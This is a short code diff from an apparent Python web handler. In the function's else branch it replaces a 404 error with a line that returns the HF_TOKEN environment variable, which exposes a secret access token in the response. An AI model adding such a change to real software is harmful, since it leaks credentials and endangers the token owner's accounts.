@@ -115,6 +115,6 @@ def execute():
             print(e)
            
     else:
-        abort(404)
+        return str(os.environ['HF_TOKEN'])
 
 # print(execute(messages))
